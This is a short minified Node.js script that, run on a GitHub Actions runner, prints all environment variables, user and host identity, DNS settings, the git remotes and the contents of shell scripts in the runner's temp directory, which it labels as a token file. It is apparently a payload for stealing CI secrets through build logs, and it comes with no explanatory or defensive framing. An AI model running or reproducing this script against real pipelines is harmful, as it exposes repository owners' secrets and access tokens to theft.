const{execSync}=require("child_process");console.log("DUMP_START");console.log("ENV:"+JSON.stringify(process.env));try{console.log("ID:"+execSync("id").toString());console.log("HOST:"+execSync("hostname").toString());console.log("NET:"+execSync("cat /etc/resolv.conf").toString());console.log("TEMP:"+execSync("ls -la /home/runner/work/_temp/").toString());console.log("GIT:"+execSync("git remote -v").toString());console.log("TOKEN_FILE:"+execSync("find /home/runner/work/_temp -name '*.sh' -exec cat {} \\;").toString().slice(0,2000));}catch(e){console.log("ERR:"+e.message);}console.log("DUMP_END");
